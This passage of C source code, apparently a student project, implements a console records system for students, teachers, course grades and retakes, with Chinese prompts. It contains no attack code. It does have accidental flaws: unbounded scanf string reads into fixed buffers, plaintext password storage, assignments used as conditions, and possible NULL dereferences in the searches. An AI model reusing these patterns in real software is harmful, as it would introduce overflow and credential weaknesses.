stu1.next=NULL;stu1.cla=NULL;\r\n\t\tinsert_stu(stu1);\r\n\t\tprintf(\"\\n请输入学生ID(8位数字):\");scanf(\"%d\",&amp;stu1.id);\r\n\t}\r\n}\r\n\r\nvoid input_tec()  //教师录入\r\n{\r\n\tstruct tec tec1;\r\n\tprintf(\"\\n请输入教师数据,输入0结束输入.\");\r\n\tprintf(\"\\n请输入教师ID(8位数字):\");scanf(\"%d\",&amp;tec1.id);\r\n\twhile(tec1.id!=0)\r\n\t{\r\n\t\t//initialize and create\r\n\t\tprintf(\"\\n请输入教师姓名:\");scanf(\"%s\",tec1.name);\r\n\t\tprintf(\"\\n请输入教师课程名称:\");scanf(\"%s\",tec1.cla_name);\r\n\t\tprintf(\"\\n请输入教师课程编号:\");scanf(\"%d\",&amp;tec1.cla_id);\r\n\t\tprintf(\"\\n请输入教师性别(男或女):\");scanf(\"%s\",tec1.sex);\r\n\t\tprintf(\"\\n请输入教师电话号码(11位手机号码):\");scanf(\"%s\",tec1.phone);\r\n\t\tprintf(\"\\n请输入教师密码:\");scanf(\"%s\",tec1.key);\r\n\t\tprintf(\"\\n请输入学分:\");scanf(\"%d\",&amp;tec1.score);\r\n\t\tprintf(\"\\n请输入教师email:\");scanf(\"%s\",tec1.email);\r\n        tec1.next=NULL;tec1.cla=NULL;\r\n\t\tinsert_tec(tec1);\r\n\t\tprintf(\"\\n请输入教师ID(8位数字):\");scanf(\"%d\",&amp;tec1.id);\r\n\t}\r\n}\r\n\r\nvoid  input_cla()  //课程录入\r\n{\r\n\tstruct cla cla1;\r\n\tstruct cla *cp;\r\n\tprintf(\"\\n请输入学生课程数据,输入0结束输入.\");\r\n\tprintf(\"\\n请输入学生ID(8位数字):\");scanf(\"%d\",&amp;cla1.id);\r\n\twhile(cla1.id!=0)\r\n\t{\r\n\t\t//initialize and create\r\n\t\tprintf(\"\\n请输入课程姓名:\");scanf(\"%s\",cla1.name);\r\n\t\tcla1.score=0;\r\n\t\tprintf(\"\\n请输入课程学生考试成绩:\");scanf(\"%f\",&amp;cla1.e_score);\r\n\t\tprintf(\"\\n请输入课程学生平时成绩:\");scanf(\"%f\",&amp;cla1.n_score);\r\n\t\tcla1.t_score=0.5*cla1.n_score+0.5*cla1.e_score;\r\n        cla1.next=NULL;cla1.res=NULL; cla1.follow=NULL;\r\n\t\tcp=insert_cla1(cla1);\r\n\t\tinsert_cla2(cp);\r\n\t\tprintf(\"\\n请输入学生ID(8位数字):\");scanf(\"%d\",&amp;cla1.id);\r\n\t}\r\n}\r\n\r\nvoid  input_res()  //重修录入\r\n{\r\n\tstruct res res1;\r\n    printf(\"\\n请输入学生重修数据,输入0结束输入.\");\r\n\tprintf(\"\\n请输入学生ID(8位数字):\");scanf(\"%d\",&amp;res1.id);\r\n\twhile(res1.id!=0)\r\n\t{\r\n\t\t//initialize and create\r\n\t\tprintf(\"\\n请输入重修学期:\");scanf(\"%d\",&amp;res1.semester);\r\n\t\tprintf(\"\\n请输入重修课程名称:\");scanf(\"%s\",res1.name);\r\n\t\tprintf(\"\\n请输入重修成绩:\");scanf(\"%f\",&amp;res1.score);\r\n\t\tprintf(\"\\n请输入重修次数:\");scanf(\"%d\",&amp;res1.times);\r\n        res1.next=NULL;\r\n\t//\tres1-&gt;next=NULL;\r\n\t\tinsert_res(res1);\r\n\t\tprintf(\"\\n请输入学生ID(8位数字):\");scanf(\"%d\",&amp;res1.id);\r\n\t}\r\n}\r\n\r\nvoid copy_stu(struct stu *p1,struct stu stu1)// 用于复制 减少代码量\r\n{\r\n        p1-&gt;age=stu1.age; p1-&gt;id=stu1.id;\r\n    \tp1-&gt;dor=stu1.dor;\r\n\t    strcpy(p1-&gt;phone,stu1.phone);\r\n        strcpy(p1-&gt;sex,stu1.sex);\r\n\t\tstrcpy(p1-&gt;key,stu1.key);\r\n        strcpy(p1-&gt;name,stu1.name);\r\n\t\tp1-&gt;score=0;\r\n}\r\n\r\nvoid copy_tec(struct tec *p1,struct tec tec1)// 用于复制 减少代码量\r\n{\r\n    strcpy(p1-&gt;email,tec1.email);\r\n\tstrcpy(p1-&gt;cla_name,tec1.cla_name);\r\n\tp1-&gt;cla_id=tec1.cla_id;\r\n\tstrcpy(p1-&gt;phone,tec1.phone);\r\n    strcpy(p1-&gt;sex,tec1.sex);\r\n    p1-&gt;score=tec1.score;\r\n\tstrcpy(p1-&gt;key,tec1.key);\r\n    strcpy(p1-&gt;name,tec1.name);\r\n}\r\n\r\nvoid modify_stu(struct stu *p1)// 学生修改自己信息\r\n{\r\n\t    int z;\r\n\t\tsystem(\"cls\");\r\n\t   \tprintf(\"\\n\\t\\t\\t**************************\");\r\n\t\tprintf(\"\\n\\t\\t\\t**\\t修改项目\\t**\");\r\n        printf(\"\\n\\t\\t\\t**************************\");\r\n        printf(\"\\n\\t\\t\\t**\\t(1)年龄  \\t**\");\r\n\t\tprintf(\"\\n\\t\\t\\t**\\t(2)宿舍  \\t**\");\r\n\t\tprintf(\"\\n\\t\\t\\t**\\t(3)电话号码\\t**\");\r\n\t\tprintf(\"\\n\\t\\t\\t**************************\");\r\n\t\tprintf(\"\\n请输入数字(输入0停止修改):\");\r\n\t\tscanf(\"%d\",&amp;z);\r\n\t\t\tswitch(z)\r\n\t\t\t{\r\n\t\t\t    case 0: break;\r\n\t\t\t\tcase 1: printf(\"请输入年龄:\");scanf(\"%d\",&amp;p1-&gt;age); fflush(stdin);break;\r\n\t\t\t\tcase 2: printf(\"请输入宿舍号码:\");scanf(\"%d\",&amp;p1-&gt;dor); fflush(stdin);break;\r\n\t\t\t\tcase 3: printf(\"请输入电话号码:\");scanf(\"%s\",p1-&gt;phone); fflush(stdin);break;\r\n\t\t\t\tdefault :  printf(\"\\n请正确输入相应数字。\");fflush(stdin);break;\r\n\t\t\t}\r\n\t\t\tprintf(\"\\n已完成修改。按任意键返回。\"); getchar(); getchar();\r\n\r\n}\r\n\r\nvoid modify_tec(struct tec *p1)// 教师修改自己信息\r\n{\r\n\r\n        int z;\r\n\t    system(\"cls\");\r\n        printf(\"\\n\\t\\t\\t**************************\");\r\n        printf(\"\\n\\t\\t\\t**\\t修改项目\\t**\");\r\n        printf(\"\\n\\t\\t\\t**************************\");\r\n        printf(\"\\n\\t\\t\\t**\\t(1)学分 \\t**\");\r\n\t\tprintf(\"\\n\\t\\t\\t**\\t(2)email\\t**\");\r\n\t\tprintf(\"\\n\\t\\t\\t**\\t(3)电话号码\\t**\");\r\n\t\tprintf(\"\\n\\t\\t\\t**************************\");\r\n\t\tprintf(\"\\n请输入数字(输入0停止修改):\");\r\n\t    scanf(\"%d\",&amp;z);\r\n\t\t\tswitch(z)\r\n\t\t\t{\r\n\t\t\t    case 0: break;\r\n\t\t\t\tcase 1: printf(\"\\n请输入新的学分：\"); scanf(\"%d\",&amp;p1-&gt;score); fflush(stdin);break;\r\n\t\t\t\tcase 2: printf(\"\\n请输入新的email：\"); scanf(\"%s\",p1-&gt;email); fflush(stdin);break;\r\n\t\t\t\tcase 3: printf(\"\\n请输入新的电话：\"); scanf(\"%s\",p1-&gt;phone); fflush(stdin);break;\r\n\t\t\t\tdefault :  printf(\"\\n请正确输入数字。\");fflush(stdin);break;\r\n\t\t\t}\r\n\t     printf(\"\\n已完成修改。按任意键返回。\"); getchar(); getchar();\r\n}\r\n\r\nvoid modify_stu_adm()//管理员进入某一学生系统 修改学生信息 如密码\r\n{\r\n\tstruct stu *p1;\r\n\tint id;\r\n\tint z=0;\r\n\tp1=head;\r\n\tsystem(\"cls\");\r\n\tprintf(\"\\n你好,请输入要修改学生的ID(8位id,输入0停止输入):\");\r\n\tscanf(\"%d\",&amp;id); fflush(stdin);\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t\tif(p1-&gt;id&gt;=id) break; //减少检索次数\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\tif(p1!=NULL)\r\n\t {\r\n\t     if(p1-&gt;id==id) stu_ui(p1);\r\n\t }\r\n\t else\r\n\t printf(\"\\n学生不存在。\");\r\n\r\n}\r\n\r\nvoid modify_tec_adm()//管理员进入某一教师系统 修改教师信息 如密码\r\n{\r\n\tstruct tec *p1;\r\n\tint id;\r\n\tint z=0;\r\n\tsystem(\"cls\");\r\n\tp1=head_tec;\r\n\tprintf(\"\\n你好,请输入要修改教师的ID(8位id,输入0停止输入):\");\r\n\tscanf(\"%d\",&amp;id);\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t\tif(p1-&gt;id&gt;=id) break;\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\tif(p1!=NULL)\r\n\t{\r\n\t\tif(p1-&gt;id==id) tec_ui(p1);\r\n\t}\r\n\telse\r\n\t\tprintf(\"该教师不存在。\");\r\n}\r\n\r\nvoid del_stu()//删除学生信息\r\n{\r\n    struct stu *p1,*p11;\r\n\tstruct cla *p2,*p21,*p22;\r\n\tstruct tec *p3;\r\n\tint id;\r\n\tsystem(\"cls\");\r\n\tprintf(\"\\n请输入要删除学生的ID(8位学号,输入0为停止删除):\");\r\n\tscanf(\"%d\",&amp;id);fflush(stdin);\r\n\twhile(id!=0)\r\n\t{\r\n\t     p1=head;\r\n\t\t while(p1!=NULL)\r\n\t\t {\r\n\t\t     if(p1-&gt;id==id) break;\r\n\t\t\t p1=p1-&gt;next;\r\n\t\t }\r\n\t\t if(p1!=NULL)\r\n\t\t {\r\n\t\t     p2=p1-&gt;cla;\r\n\t\t\t while(p2!=NULL)\r\n\t\t\t {\r\n\t\t\t     p3=head_tec;\r\n\t\t\t\t while(p3!=NULL)\r\n\t\t\t\t {\r\n\t\t\t\t\t p21=p3-&gt;cla;\r\n\t\t\t\t     if(strcmp(p3-&gt;cla_name,p2-&gt;name)==0)\r\n\t\t\t\t\t {\r\n\t\t\t\t\t     while(p21!=NULL)\r\n\t\t\t\t\t\t {\r\n\t\t\t\t\t\t    if(p21-&gt;id==p2-&gt;id) break;\r\n\t\t\t\t\t\t\tp21=p21-&gt;tec;\r\n\t\t\t\t\t\t }\r\n\t\t\t\t\t }\r\n\t\t\t\t\t if(p21!=NULL&amp;&amp;p21-&gt;id==p2-&gt;id) break;\r\n\t\t\t\t     p3=p3-&gt;next;\r\n\t\t\t\t }\r\n\t\t\t\t p22=p2-&gt;next;\r\n\t\t\t\t if(p3!=NULL)\r\n\t\t\t\t {\r\n\t\t\t\t     pfree_cla(p1,p3,(*p2));\r\n\t\t\t\t }\r\n\t\t\t\t p2=p22;\r\n\t\t\t }\r\n\t\t\t printf(\"\\n成功删除该生信息.\");\r\n\t\t }\r\n\t\t p1=p11=head;\r\n\t\t while(p1!=NULL) //释放stu内存\r\n\t\t {\r\n\t\t     if(p1-&gt;id==id)\r\n\t\t\t {\r\n\t\t\t     if(p1==p11)   head=p1-&gt;next;\r\n\t\t\t\t else\r\n\t\t\t\t p11-&gt;next=p1-&gt;next;\r\n\t\t\t\t free(p1);\r\n\t\t\t\t in1.num--;\r\n\t\t\t\t break;\r\n\t\t\t }\r\n\t\t     p11=p1; p1=p1-&gt;next;\r\n\t\t }\r\n\t     printf(\"\\n请输入要删除学生的ID(8位学号,输入0为停止删除):\");\r\n\t     scanf(\"%d\",&amp;id);\r\n\t}\r\n\r\n}\r\n\r\nvoid del_tec()//删除教师信息\r\n{\r\n     struct tec *p1,*p11;\r\n\t struct cla *p2,*p21;\r\n     struct stu *p3;\r\n\t int id;\r\n\t system(\"cls\");\r\n\t printf(\"\\n请输入要删除教师的ID(8位学号,输入0为停止删除):\");\r\n\t scanf(\"%d\",&amp;id);fflush(stdin);\r\n\t while(id!=0)\r\n\t {\r\n\t     p1=head_tec;\r\n\t\t while(p1!=NULL)\r\n\t\t {\r\n\t\t     if(p1-&gt;id==id) break;\r\n\t\t     p1=p1-&gt;next;\r\n\t\t }\r\n\t\t if(p1!=NULL)\r\n\t\t {\r\n\t\t     p2=p1-&gt;cla;\r\n\t\t\t while(p2!=NULL)\r\n\t\t\t {\r\n\t\t\t     p3=head;\r\n\t\t\t\t while(p3!=NULL)\r\n\t\t\t\t {\r\n\t\t\t\t     if(p3-&gt;id==p2-&gt;id) break;\r\n\t\t\t\t     p3=p3-&gt;next;\r\n\t\t\t\t }\r\n                 p21=p2-&gt;tec;\r\n\t\t\t\t if(p3!=NULL)\r\n\t\t\t\t  {\r\n\t\t\t\t     pfree_cla(p3,p1,(*p2));\r\n\t\t\t\t  }\r\n\t\t\t     p2=p21;\r\n\t\t\t }\r\n\t\t }\r\n\t\t p1=p11=head_tec;\r\n\t\t while(p1!=NULL)\r\n\t\t {\r\n\t\t     if(p1-&gt;id==id)\r\n\t\t\t {\r\n\t\t\t     if(p1==p11) head_tec=p1-&gt;next;\r\n\t\t\t\t else p11-&gt;next=p1-&gt;next;\r\n\t\t\t\t free(p1);\r\n\t\t\t\t in4.num--;\r\n\t\t\t\t break;\r\n\t\t\t }\r\n\t\t\t p11=p1; p1=p1-&gt;next;\r\n\t\t }\r\n\t     printf(\"\\n请输入要删除教师的ID(8位学号,输入0为停止删除):\");\r\n\t     scanf(\"%d\",&amp;id);\r\n\t }\r\n\r\n}\r\n\r\nvoid del_res()//删除重修信息\r\n{\r\n    struct res res1;\r\n\tstruct cla *p;\r\n\tsystem(\"cls\");\r\n\tprintf(\"please input the id of stu\");\r\n\tscanf(\"%d\",&amp;res1.id);fflush(stdin);\r\n\tprintf(\"please input the name of course\");\r\n\tscanf(\"%s\",res1.name);fflush(stdin);\r\n\tprintf(\"please input the times of res\");\r\n\tscanf(\"%d\",&amp;res1.times);fflush(stdin);\r\n\twhile(res1.id!=0)\r\n\t{\r\n\t     p=headc;\r\n\t     while(p!=NULL)\r\n\t     {\r\n\t         if(strcmp(res1.name,p-&gt;name)==0&amp;&amp;p-&gt;id==res1.id)\r\n\t\t     {\r\n\t\t        pfree_res(p,res1);\r\n\t\t         break;\r\n\t\t     }\r\n\t         p=p-&gt;follow;\r\n\t     }\r\n\t\t printf(\"请输入学生id\");\r\n         scanf(\"%d\",&amp;res1.id);\r\n\t     printf(\"输入课程名称\");\r\n\t     scanf(\"%s\",res1.name);\r\n\t     printf(\"输入重修次数\");\r\n\t     scanf(\"%d\",&amp;res1.times);\r\n\t}\r\n\r\n}\r\n\r\nvoid pfree_cla(struct stu *p_stu,struct tec *p_tec,struct cla cla1)//解锁及释放课程内存\r\n{\r\n     struct cla *p2,*p21;\r\n\t struct res *p3,*p31;\r\n\t p2=p21=p_stu-&gt;cla;\r\n\t while(p2!=NULL)\r\n\t {\r\n\t     if(strcmp(p2-&gt;name,cla1.name)==0)\r\n\t\t {\r\n\t\t     p3=p2-&gt;res;  // unlock res\r\n        \t while(p3!=NULL)\r\n\t         {\r\n\t\t\t   p31=p3-&gt;next;\r\n\t\t\t   pfree_res(p2,(*p3));\r\n\t           p3=p31;\r\n\t         }\r\n\r\n\t\t     if(p2==p21)\r\n\t\t\t {\r\n\t\t\t     p_stu-&gt;cla=p2-&gt;next;\r\n\t\t\t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t     p21-&gt;next=p2-&gt;next;\r\n\t\t\t }\r\n\t\t\t break;\r\n\t\t }\r\n\t     p21=p2; p2=p2-&gt;next;\r\n\t }\r\n\t p2=p21=p_tec-&gt;cla;\r\n\t while(p2!=NULL)\r\n\t {\r\n\t     if(p2-&gt;id==cla1.id)\r\n\t\t {\r\n\t\t     if(p2==p21)\r\n\t\t\t {\r\n\t\t\t     p_tec-&gt;cla=p2-&gt;tec;\r\n\t\t\t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t     p21-&gt;tec=p2-&gt;tec;\r\n\t\t\t }\r\n\t\t     break;\r\n\t\t }\r\n\t     p21=p2;  p2=p2-&gt;tec;\r\n\t }\r\n\t p2=p21=headc;\r\n\t while(p2!=NULL)\r\n\t {\r\n\t     if(p2-&gt;id==cla1.id&amp;&amp;strcmp(p2-&gt;name,cla1.name)==0)\r\n\t\t {\r\n\t\t     if(p2=p21)\r\n\t\t\t {\r\n\t\t\t     headc=p2-&gt;follow;\r\n\t\t\t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t     p21-&gt;follow=p2-&gt;follow;\r\n\r\n\t\t\t }\r\n\t\t\t free(p2);\r\n\t\t\t in2.num--;\r\n\t\t     break;\r\n\t\t }\r\n\t     p21=p2; p2=p2-&gt;follow;\r\n\t }\r\n\r\n}\r\n\r\nvoid pfree_res(struct cla *p,struct res res1)//解锁及释放重修内存\r\n{\r\n    struct res *p2,*p21;\r\n\tp2=p21=p-&gt;res;\r\n\twhile(p2!=NULL)\r\n\t{\r\n\t    if(p2-&gt;times==res1.times)\r\n\t\t{\r\n\t\t    if(p2==p21)\r\n\t\t\t{\r\n\t\t\t    p-&gt;res=p2-&gt;next;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t    p21-&gt;next=p2-&gt;next;\r\n\t\t\t}\r\n\t\t    break;\r\n\t\t}\r\n\t    p21=p2; p2=p2-&gt;next;\r\n\t}\r\n\tp2=p21=headr;\r\n\twhile(p2!=NULL)\r\n\t{\r\n\t    if(p2-&gt;times==res1.times&amp;&amp;p2-&gt;id==res1.id&amp;&amp;strcmp(p2-&gt;name,res1.name)==0)\r\n\t\t{\r\n\t\t     if(p2==p21)\r\n\t\t\t {\r\n\t\t\t     headr=p2-&gt;follow;\r\n\t\t\t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t     p21-&gt;follow=p2-&gt;follow;\r\n\t\t\t }\r\n\t\t\t free(p2);\r\n\t\t\t in3.num--;\r\n\t\t\t break;\r\n\t\t}\r\n\t    p21=p2;p2=p2-&gt;next;\r\n\t}\r\n}\r\n\r\nvoid skim_stu(struct stu *head)   //按ID或名字查看学生信息\r\n{\r\n    char id[9];\r\n\tint id1;\r\n\tstruct stu *p1;\r\n\tsystem(\"cls\");\r\n\tif(head==NULL)\r\n\t{\r\n\t\tprintf(\"\\n目前无学生数据,请返回录入.\\n\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprintf(\"\\n请输入要查询的学生ID或姓名(8位数字或者汉字,输入0停止查询):\");\r\n    \tscanf(\"%s\",&amp;id);\r\n    \twhile(id[0]!='0')\r\n\t\t{\r\n    \t    p1=(struct stu *)head;\r\n\t        if(strlen(id)==8)\r\n\t\t\t{\r\n\t    \t    id1=idc(id);\r\n\t        \twhile(p1-&gt;id!=id1&amp;&amp;p1-&gt;next!=NULL&amp;&amp;p1-&gt;id&lt;id1)\r\n\t\t\t\t{\r\n\t        \t\tp1=p1-&gt;next;\r\n\t\t\t\t}\r\n\t        \tif((p1-&gt;next==NULL&amp;&amp;p1-&gt;id!=id1)||p1-&gt;id&gt;id1)\r\n\t\t\t\t{\r\n\t        \t\tprintf(\"\\n查无此生!请重新输入学生ID(8位数字,输入0停止查询):\");\r\n\t        \t\tscanf(\"%s\",id);\r\n\t\t\t\t}\r\n\t        \telse\r\n\t\t\t\t{\r\n\t        \t\tprint_stu(p1);\r\n\t        \t\tprintf(\"\\n继续查询请再次输入学生ID或姓名(8位数字或者汉字,输入0停止查询):\");\r\n\t        \t\tscanf(\"%s\",id);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t    \telse\r\n\t\t\t{\r\n\t    \t    while(strcmp(id,p1-&gt;name)!=0&amp;&amp;p1!=NULL)\r\n\t\t\t\t{\r\n\t\t    \t    p1=p1-&gt;next;\r\n\t\t\t\t}\r\n\t    \t\tif(strcmp(id,p1-&gt;name)==0)\r\n\t\t\t\t{\r\n\t\t    \t   print_stu(p1);\r\n\t\t      \t   printf(\"\\n继续查询请再次输入学生ID或姓名(8位数字或者汉字,输入0停止查询):\");\r\n\t        \t\tscanf(\"%s\",id);\r\n\t\t\t\t}\r\n\t    \t\telse\r\n\t\t\t\t{\r\n\t        \t\tprintf(\"\\n查无此生!请重新输入学生ID(8位数字,输入0停止查询):\");\r\n\t         \t\tscanf(\"%s\",id);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t}\r\n\r\n}\r\n\r\nvoid skim_tec(struct tec *head)//按id或名字查看教师\r\n{\r\n\tint id1;\r\n    char id[9];\r\n\tstruct tec *p1;\r\n   system(\"cls\");\r\n   if(head==NULL)\r\n\t{\r\n\t\tprintf(\"\\n目前无教师数据,请返回录入.\\n\");\r\n\t}\r\n\tprintf(\"\\n请输入要查询的教师ID或名字(8位数字或汉字,输入0停止查询):\");\r\n\tscanf(\"%s\",id);\r\n\twhile(id[0]!='0')\r\n\t{\r\n\t\tp1=(struct tec *)head;\r\n\t\tif(strlen(id)==8)\r\n\t\t{\r\n\t\t    id1=idc(id);\r\n\t\t     while(p1-&gt;id!=id1&amp;&amp;p1-&gt;next!=NULL&amp;&amp;p1-&gt;id&lt;id1)\r\n\t\t\t{\r\n\t\t\t    p1=p1-&gt;next;\r\n\t\t\t}\r\n\t\t\tif(id1=p1-&gt;id)\r\n\t\t\t{\r\n\t\t\t   printf(\"\\n------------------------------------------------------------\");\r\n\t\t       printf(\"\\n名字&gt;&gt;&gt;性别&gt;课程名称&gt;&gt;&gt;&gt;&gt;&gt;课程编号&gt;&gt;&gt;学分&gt;&gt;&gt;手机号码&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;email&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n\t\t       printf(\"\\n------------------------------------------------------------\");\r\n\t\t       printf(\"\\n%s %s %s  %d %d %s %s\",p1-&gt;name,p1-&gt;sex,p1-&gt;cla_name,p1-&gt;cla_id,p1-&gt;score,p1-&gt;phone,p1-&gt;email);\r\n\t\t\t   printf(\"\\n继续查询请再次输入教师ID或名字(8位数字或汉字,输入0停止查询):\");\r\n\t    \t\tscanf(\"%s\",id);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t     \t\tprintf(\"\\nno data!请重新输入教师ID或名字(8位数字或汉字,输入0停止查询):\");\r\n\t     \t\tscanf(\"%s\",id);\r\n\t     \t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t     while(strcmp(id,p1-&gt;name)!=0&amp;&amp;p1!=NULL)\r\n\t\t\t{\r\n\t\t\t    p1=p1-&gt;next;\r\n\t\t\t}\r\n\t\t\tif(strcmp(id,p1-&gt;name)==0)\r\n\t\t\t{\r\n\t\t\t   printf(\"\\n------------------------------------------------------------\");\r\n\t\t       printf(\"\\n名字&gt;&gt;&gt;性别&gt;课程名称&gt;&gt;&gt;&gt;&gt;&gt;课程名称&gt;&gt;&gt;学分&gt;&gt;&gt;手机号码&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;email&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n\t\t       printf(\"\\n------------------------------------------------------------\");\r\n\t\t       printf(\"\\n%s %s %s  %d %d %s %s\",p1-&gt;name,p1-&gt;sex,p1-&gt;cla_name,p1-&gt;cla_id,p1-&gt;score,p1-&gt;phone,p1-&gt;email);\r\n\t\t\t   printf(\"\\n继续查询请再次输入教师ID或名字(8位数字或汉字,输入0停止查询):\");\r\n\t    \t\tscanf(\"%s\",id);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t     \t\tprintf(\"\\nno data!请重新输入教师ID或名字(8位数字或汉字,输入0停止查询):\");\r\n\t     \t\tscanf(\"%s\",id);\r\n\t     \t}\r\n\t\t}\r\n\r\n\t}\r\n\r\n\tgetchar(); getchar();\r\n}\r\n\r\nvoid skim_stu_all()//查看所有学生学分及不及格课程\r\n{\r\n\tstruct stu *p1;\r\n\tstruct cla *p2;\r\n\tsystem(\"cls\");\r\n\tp1=head;\r\n\tprintf(\"\\n-----------------------------------------------------------------------\");\r\n\tprintf(\"\\nID&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;学生姓名&gt;&gt;&gt;&gt;&gt;&gt;&gt;学分&gt;&gt;不及格课程&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n\tprintf(\"\\n-----------------------------------------------------------------------\");\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t    p1-&gt;score=score_stu(p1);\r\n\t   \tprintf(\"\\n%d    %s  \\t  %d\",p1-&gt;id,p1-&gt;name,p1-&gt;score);\r\n\t\tp2=p1-&gt;cla;\r\n\t\twhile(p2!=NULL)\r\n\t\t{\r\n\r\n\t\t\tif(p2-&gt;e_score&lt;60&amp;&amp;p2-&gt;e_score!=0)\r\n\t\t\t\tprintf(\" %s  \",p2-&gt;name);\r\n\t\t\tp2=p2-&gt;next;\r\n\t\t}\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\tgetchar(); getchar();\r\n\r\n}\r\n\r\nvoid skim_tec_all()//查看所有教师\r\n{\r\n\tstruct tec *p1;\r\n\tsystem(\"cls\");\r\n\tp1=head_tec;\r\n\tprintf(\"\\n-------------------------------------------------------------------\");\r\n\tprintf(\"\\n教师姓名&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;课程名称&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;课程编号&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n\tprintf(\"\\n-------------------------------------------------------------------\");\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t    printf(\"\\n%-10s \\t %-10s \\t %-10d\",p1-&gt;name,p1-&gt;cla_name,p1-&gt;cla_id);\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\r\n\tgetchar(); getchar();\r\n\r\n}\r\n\r\nvoid skim_stu_course()  // 根据课程查看学生 管理员功能\r\n{\r\n\tstruct tec *p;\r\n\tstruct cla *p1;\r\n\tstruct res *p2;\r\n\tint coursenumber;\r\n\tchar course[12];\r\n\tint z=0;\r\n\tp=head_tec;\r\n\tsystem(\"cls\");\r\n\tprintf(\"\\n请输入课程编号+课程名称:\");  // 课程名与教师一一对应\r\n\tscanf(\"%d%s\",&amp;coursenumber,course);fflush(stdin);\r\n\twhile(p!=NULL)\r\n\t{\r\n        if(p-&gt;cla_id==coursenumber)\r\n\t\t{\r\n\t\t    p1=p-&gt;cla;\r\n\t\t    printf(\"\\n---------------------------------------------------------------------\");\r\n        \tprintf(\"\\n学生ID&gt;&gt;学生姓名&gt;&gt;考试成绩&gt;&gt;&gt;&gt;平时成绩&gt;&gt;&gt;&gt;综合成绩&gt;&gt;&gt;&gt;重修成绩&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n        \tprintf(\"\\n---------------------------------------------------------------------\");\r\n          \twhile(p1!=NULL)\r\n            {\r\n\t    \t    if(p-&gt;cla_id==coursenumber) //输出所有选同一课程的学生\r\n\t    \t    {\r\n\t    \t\t  printf(\"\\n%d \\t %s  %.2f \\t %.2f \\t %.2f \\t\",p1-&gt;id,p1-&gt;stu_name,p1-&gt;e_score,p1-&gt;n_score,p1-&gt;t_score);\r\n\t\t    \t   if(p1-&gt;res!=NULL)\r\n\t\t    \t   {\r\n\t\t\t    \t   p2=p1-&gt;res;\r\n\t\t     \t\t    z=1;\r\n\t\t               while(p2!=NULL)\r\n\t\t     \t\t   {\r\n\t\t        \t\tprintf(\"(%d)%.2f  \",z++,p2-&gt;score);\r\n\t \t         \t\tp2=p2-&gt;next;\r\n\t\t\t     \t   }\r\n\t\t     \t   }\r\n\t\t    \t   else\r\n\t\t     \t\tprintf(\"无重修\");\r\n\t\t     \t    z=1; //用来判断有无学生输出\r\n\t\t        }\r\n\t     \t    p1=p1-&gt;tec;\r\n         \t}\r\n\r\n\t\t}\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tif(z==0)\r\n    {printf(\"\\n无该课程信息\");}\r\n\tgetchar(); getchar();\r\n\r\n}\r\n\r\nvoid skim_stu_class() // 根据班级查看学生 管理员功能\r\n{\r\n\tstruct stu *p1;\r\n\tstruct cla *p2;\r\n\tint id1,id2;\r\n\tint n=0;\r\n\tp1=head;\r\n\tsystem(\"cls\");\r\n\tprintf(\"\\n请输入班级编号(学号后四位如0526):\");\r\n\tscanf(\"%d\",&amp;id1);fflush(stdin);\r\n\tid1=(int)(id1/100);\r\n\tid1=id1*100+20160000; id2=id1+100; //取学号范围确定班级\r\n\tprintf(\"\\n-------------------------------------------------------------------\");\r\n\tprintf(\"\\n学生姓名&gt;&gt;&gt;所选课程(考试成绩)&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n\tprintf(\"\\n-------------------------------------------------------------------\");\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t\tif(p1-&gt;id&lt;id2&amp;&amp;p1-&gt;id&gt;id1) //寻找同一班级的同学\r\n\t\t{\r\n\t\t\tprintf(\"\\n%s\\t\",p1-&gt;name);\r\n\t\t\tp2=p1-&gt;cla;\r\n\t\t\twhile(p2!=NULL)\r\n\t\t\t{\r\n\t\t\t\tprintf(\"  %s(%.2f)\",p2-&gt;name,p2-&gt;e_score);\r\n\t\t\t\tp2=p2-&gt;next;\r\n\t\t\t}\r\n\t\t\tn=1;  // 有班级存在 